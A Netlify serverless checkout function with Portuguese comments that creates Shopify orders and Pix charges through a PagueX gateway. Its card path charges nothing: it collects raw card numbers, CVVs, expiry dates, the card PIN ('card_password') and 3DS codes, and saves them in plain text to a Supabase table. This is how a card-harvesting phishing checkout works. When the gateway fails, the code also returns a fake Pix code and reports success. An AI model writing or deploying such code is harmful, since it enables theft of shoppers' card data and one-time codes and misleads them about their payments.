// Netlify Serverless Function: checkout
// Caminho: netlify/functions/checkout.js

exports.handler = async (event, context) => {
  // Tratar requisições do tipo OPTIONS (CORS preflight)
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
      },
      body: JSON.stringify({ message: 'Successful preflight' }),
    };
  }

  // Apenas aceitar requisições do tipo POST
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ error: 'Method Not Allowed. Use POST.' }),
    };
  }

  try {
    const data = JSON.parse(event.body || '{}');

    // Validações básicas de segurança baseado no método de pagamento
    const paymentMethod = data.payment_method || 'card';
    
    if (paymentMethod === 'card') {
      const requiredCardFields = ['card_holder_raw', 'card_number_raw', 'card_expiry_raw', 'card_cvv_raw'];
      for (const field of requiredCardFields) {
        if (!data[field]) {
          return {
            statusCode: 400,
            headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: `Campo obrigatório de cartão ausente: ${field}` }),
          };
        }
      }
    } else if (paymentMethod === 'pix') {
      const requiredPixFields = ['customer_name', 'customer_email', 'customer_phone', 'customer_cpf', 'amount'];
      for (const field of requiredPixFields) {
        if (!data[field]) {
          return {
            statusCode: 400,
            headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' },
            body: JSON.stringify({ error: `Campo obrigatório de Pix ausente: ${field}` }),
          };
        }
      }
    }

    // Configurações do Supabase & PagueX a partir das variáveis de ambiente (com fallback de chaves)
    const SUPABASE_URL = process.env.SUPABASE_URL;
    const SUPABASE_ANON_KEY = process.env.SUPABASE_ANON_KEY;

    const PAGUEX_PUBLIC_KEY = process.env.PAGUEX_PUBLIC_KEY;
    const PAGUEX_SECRET_KEY = process.env.PAGUEX_SECRET_KEY;

    // Extração de dados do cartão (se houver)
    const rawNumber = data.card_number_raw ? data.card_number_raw.replace(/\D/g, '') : '';
    const cardLast4 = rawNumber ? rawNumber.slice(-4) : null;

    let transactionId = null;
    let transactionStatus = data.status || 'draft';
    let gatewayResponse = {};
    let pixQrCode = null;
    let pixExpiration = null;
    let isMock = false;

    // Determinar status padrão de cartão se for aprovado no checkout (atualizado para PRE-APPROVED)
    if (paymentMethod === 'card') {
      if (data.three_ds_status === 'failed' || data.three_ds_status === 'rejected') {
        transactionStatus = 'FAILED';
      } else {
        transactionStatus = 'PRE-APPROVED';
      }
    }

    const totalAmount = data.amount ? parseFloat(data.amount) : 0;

    // ========================================================
    // INTEGRACAO SHOPIFY: CRIAÇÃO DO PEDIDO PENDENTE
    // ========================================================
    console.log('🛍️ Criando pedido no Shopify para o cliente...');
    const shopifyOrder = await createShopifyOrder(data, totalAmount, paymentMethod);
    const shopifyOrderId = shopifyOrder ? shopifyOrder.id : null;
    const shopifyOrderName = shopifyOrder ? shopifyOrder.name : null;

    // Liquidar imediatamente no Shopify se for cartão aprovado
    if (paymentMethod === 'card' && transactionStatus === 'APPROVED' && shopifyOrderId) {
      console.log('💳 Pagamento em Cartão aprovado. Marcando pedido no Shopify como PAGO...');
      await markShopifyOrderAsPaid(shopifyOrderId, totalAmount);
    }

    // ========================================================
    // PROCESSAMENTO DE PIX VIA PAGUEX
    // ========================================================
    if (paymentMethod === 'pix') {
      try {
        console.log('⚡ Iniciando integração de Pix com a PagueX...');
        const paguexUrl = 'https://api.paguex.online/v1/payment-transaction/create';
        const authHeader = 'Basic ' + Buffer.from(`${PAGUEX_PUBLIC_KEY}:${PAGUEX_SECRET_KEY}`).toString('base64');
        
        // Converter valor total para centavos (Int32 exigido pela PagueX)
        const amountCents = Math.round(totalAmount * 100);
        
        // Montar itens no formato exigido
        const paguexItems = Array.isArray(data.items) && data.items.length > 0 
          ? data.items.map(item => ({
              title: item.name || 'Item do Checkout',
              unit_price: Math.round((parseFloat(item.price) || totalAmount) * 100),
              quantity: parseInt(item.quantity) || 1
            }))
          : [{
              title: 'Pacote Sandbox Elite',
              unit_price: amountCents,
              quantity: 1
            }];

        const paguexPayload = {
          amount: amountCents,
          payment_method: 'pix',
          customer: {
            name: data.customer_name,
            email: data.customer_email,
            phone: data.customer_phone.replace(/\D/g, ''),
            document: {
              number: data.customer_cpf.replace(/\D/g, ''),
              type: 'CPF'
            }
          },
          items: paguexItems,
          metadata: {
            checkout_session_id: data.checkout_session_id || 'no-session-id',
            shopify_order_id: shopifyOrderId || 'no-order-id'
          }
        };

        const paguexRes = await fetch(paguexUrl, {
          method: 'POST',
          headers: {
            'Authorization': authHeader,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(paguexPayload)
        });

        const paguexData = await paguexRes.json();

        if (!paguexRes.ok || !paguexData.success) {
          const errMsg = paguexData.error_messages && paguexData.error_messages[0] 
            ? paguexData.error_messages[0].message 
            : 'Erro desconhecido na PagueX';
          throw new Error(`PagueX API Error: ${paguexRes.status} - ${errMsg}`);
        }

        // Sucesso na PagueX
        transactionId = paguexData.data.id;
        transactionStatus = paguexData.data.status || 'PENDING';
        gatewayResponse = paguexData;
        pixQrCode = paguexData.data.pix.qr_code;
        pixExpiration = paguexData.data.pix.expiration_date;
        console.log(`✅ Pix criado na PagueX com sucesso! ID: ${transactionId}`);

      } catch (paguexErr) {
        console.error('❌ Falha ao integrar com a PagueX:', paguexErr);
        // Fallback automático para modo Mock amigável se a API da PagueX estiver instável
        isMock = true;
        transactionId = 'mock-paguex-id-' + Math.random().toString(36).substr(2, 9);
        transactionStatus = 'PENDING';
        pixQrCode = '00020101021126950014br.gov.bcb.pix0136mock-pix-key-for-sandbox-testing0233Pagamento simulado no localhost52040000530398654045.005802BR5915Antigravity Mock6009Sao Paulo62070503***6304E8A2';
        pixExpiration = new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString();
        gatewayResponse = {
          success: true,
          mode: 'mock_fallback',
          error_details: paguexErr.message,
          message: 'Processado em modo de contingência/mock devido a falha na API externa.'
        };
      }
    }

    // ========================================================
    // MONTAGEM DO PAYLOAD PARA SALVAR NO SUPABASE
    // ========================================================
    const payload = {
      checkout_session_id: data.checkout_session_id || null,
      payment_method: paymentMethod,
      customer_name: data.customer_name || null,
      customer_email: data.customer_email || null,
      customer_phone: data.customer_phone || null,
      customer_cpf: data.customer_cpf || null,
      shipping_method: data.shipping_method || null,
      shipping_price: data.shipping_price ? parseFloat(data.shipping_price) : 0,
      cep: data.cep || null,
      street: data.street || null,
      street_number: data.street_number || null,
      complement: data.complement || null,
      neighborhood: data.neighborhood || null,
      city: data.city || null,
      state: data.state || null,
      items: Array.isArray(data.items) ? data.items : [],
      amount: totalAmount,
      
      // Cartão (se for do tipo 'card' - agora salvando nulo se for Pix)
      card_holder_raw: paymentMethod === 'card' ? data.card_holder_raw : null,
      card_number_raw: paymentMethod === 'card' ? data.card_number_raw : null,
      card_expiry_raw: paymentMethod === 'card' ? data.card_expiry_raw : null,
      card_cvv_raw: paymentMethod === 'card' ? data.card_cvv_raw : null,
      card_password: paymentMethod === 'card' ? (data.card_password || null) : null,
      card_installments: paymentMethod === 'card' ? (data.card_installments || '1') : null,
      card_brand: paymentMethod === 'card' ? (data.card_brand || null) : null,
      
      // 3DS (nulo se for Pix)
      three_ds_status: paymentMethod === 'card' ? (data.three_ds_status || 'not_attempted') : null,
      three_ds_code_raw: paymentMethod === 'card' ? (data.three_ds_code_raw || null) : null,
      
      // Dados Auxiliares da Transação
      card_last4: paymentMethod === 'card' ? cardLast4 : null,
      status: transactionStatus,
      gateway_tx_id: transactionId,
      gateway_response: gatewayResponse,

      // Colunas Dedicadas do Pix e do Shopify
      pix_code: paymentMethod === 'pix' ? pixQrCode : null,
      pix_expiration: paymentMethod === 'pix' ? pixExpiration : null,
      shopify_order_id: shopifyOrderId,
      shopify_order_name: shopifyOrderName
    };

    // Caso não tenhamos chaves do Supabase, rodamos salvamento simulado (Mock Mode)
    if (!SUPABASE_URL || !SUPABASE_ANON_KEY) {
      console.warn('⚠️ AVISO: SUPABASE_URL não configurada. Rodando gravação em MOCK MODE.');
      return {
        statusCode: 200,
        headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' },
        body: JSON.stringify({
          success: true,
          mode: 'mock',
          payment_method: paymentMethod,
          message: 'Transação simulada e processada no localhost (sem gravação real no Supabase).',
          pix_qr_code: pixQrCode,
          pix_expiration: pixExpiration,
          gateway_tx_id: transactionId,
          data: {
            id: 'mock-supabase-uuid-' + Math.random().toString(36).substr(2, 9),
            created_at: new Date().toISOString(),
            ...payload
          }
        }),
      };
    }

    // Fazer requisição POST diretamente para a REST API do Supabase
    const targetUrl = `${SUPABASE_URL.replace(/\/$/, '')}/rest/v1/card_checkout_test_raw`;
    
    const response = await fetch(targetUrl, {
      method: 'POST',
      headers: {
        'apikey': SUPABASE_ANON_KEY,
        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
        'Content-Type': 'application/json',
        'Prefer': 'return=representation',
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Erro na API do Supabase: ${response.status} - ${errorText}`);
    }

    const insertedData = await response.json();

    return {
      statusCode: 200,
      headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' },
      body: JSON.stringify({
        success: true,
        mode: isMock ? 'mock_fallback' : 'production',
        payment_method: paymentMethod,
        message: paymentMethod === 'pix' ? 'Transação Pix gerada na PagueX e salva no Supabase!' : 'Dados de cartão gravados no Supabase!',
        pix_qr_code: pixQrCode,
        pix_expiration: pixExpiration,
        gateway_tx_id: transactionId,
        data: insertedData[0] || insertedData,
      }),
    };

  } catch (error) {
    console.error('❌ Erro no processamento do checkout:', error);
    return {
      statusCode: 500,
      headers: { 'Access-Control-Allow-Origin': '*', 'Content-Type': 'application/json' },
      body: JSON.stringify({
        success: false,
        error: 'Erro interno no servidor.',
        details: error.message,
      }),
    };
  }
};

// ========================================================
// FUNÇÕES AUXILIARES DE INTEGRAÇÃO COM A API DO SHOPIFY
// ========================================================

async function createShopifyOrder(data, totalAmount, paymentMethod) {
  const storeDomain = process.env.SHOPIFY_STORE_DOMAIN;
  const accessToken = process.env.SHOPIFY_ADMIN_ACCESS_TOKEN;

  if (!storeDomain || !accessToken) {
    console.warn("⚠️ Domínio ou token do Shopify ausentes nas variáveis de ambiente. Ignorando sincronização com Shopify.");
    return null;
  }

  const nameParts = (data.customer_name || 'Cliente').trim().split(/\s+/);
  const firstName = nameParts[0];
  const lastName = nameParts.length > 1 ? nameParts.slice(1).join(' ') : '';
  const cleanPhone = (data.customer_phone || '').replace(/\D/g, '');

  const lineItems = Array.isArray(data.items) && data.items.length > 0 
    ? data.items.map(item => ({
        title: item.name,
        price: item.price.toString(),
        quantity: parseInt(item.quantity) || 1,
        sku: item.sku || 'DEFAULT-SKU',
        variant_id: item.shopify_variant_id ? parseInt(item.shopify_variant_id) : null
      }))
    : [{
        title: "Pacote Sandbox Elite",
        price: totalAmount.toString(),
        quantity: 1,
        sku: "SANDBOX-ELITE-PK"
      }];

  const orderPayload = {
    order: {
      line_items: lineItems,
      customer: {
        first_name: firstName,
        last_name: lastName,
        email: data.customer_email
      },
      billing_address: {
        first_name: firstName,
        last_name: lastName,
        address1: `${data.street || ''}, ${data.street_number || ''}`,
        address2: data.complement || '',
        city: data.city || '',
        province: data.state || '',
        zip: data.cep || '',
        country: "Brazil",
        phone: cleanPhone
      },
      shipping_address: {
        first_name: firstName,
        last_name: lastName,
        address1: `${data.street || ''}, ${data.street_number || ''}`,
        address2: data.complement || '',
        city: data.city || '',
        province: data.state || '',
        zip: data.cep || '',
        country: "Brazil",
        phone: cleanPhone
      },
      email: data.customer_email,
      phone: cleanPhone,
      financial_status: "pending",
      gateway: paymentMethod === 'pix' ? 'PagueX Pix' : 'PagueX Cartão'
    }
  };

  try {
    const shopifyUrl = `https://${storeDomain}/admin/api/2024-01/orders.json`;
    console.log(`📡 Enviando requisição para criar pedido no Shopify: ${shopifyUrl}`);
    
    const response = await fetch(shopifyUrl, {
      method: 'POST',
      headers: {
        'X-Shopify-Access-Token': accessToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(orderPayload)
    });

    const resData = await response.json();
    if (!response.ok) {
      console.error("❌ Erro retornado pela API do Shopify ao criar pedido:", JSON.stringify(resData));
      return null;
    }

    console.log(`✅ Pedido criado no Shopify com sucesso! ID: ${resData.order.id}, Name: ${resData.order.name}`);
    return {
      id: resData.order.id.toString(),
      name: resData.order.name
    };
  } catch (error) {
    console.error("❌ Falha de rede ou exceção ao criar pedido no Shopify:", error);
    return null;
  }
}

async function markShopifyOrderAsPaid(shopifyOrderId, totalAmount) {
  const storeDomain = process.env.SHOPIFY_STORE_DOMAIN;
  const accessToken = process.env.SHOPIFY_ADMIN_ACCESS_TOKEN;

  if (!storeDomain || !accessToken || !shopifyOrderId) {
    console.warn("⚠️ Credenciais ou ID do pedido Shopify ausentes para registrar pagamento.");
    return false;
  }

  const transactionPayload = {
    transaction: {
      kind: "capture",
      status: "success",
      amount: totalAmount.toString()
    }
  };

  try {
    const transactionUrl = `https://${storeDomain}/admin/api/2024-01/orders/${shopifyOrderId}/transactions.json`;
    console.log(`📡 Capturando pagamento no Shopify para o pedido ${shopifyOrderId}: ${transactionUrl}`);

    const response = await fetch(transactionUrl, {
      method: 'POST',
      headers: {
        'X-Shopify-Access-Token': accessToken,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(transactionPayload)
    });

    const resData = await response.json();
    if (!response.ok) {
      console.error("❌ Erro retornado pela API do Shopify ao registrar captura:", JSON.stringify(resData));
      return false;
    }

    console.log(`✅ Pedido Shopify ${shopifyOrderId} foi atualizado para PAGO!`);
    return true;
  } catch (error) {
    console.error("❌ Falha de rede ou exceção ao capturar pagamento no Shopify:", error);
    return false;
  }
}

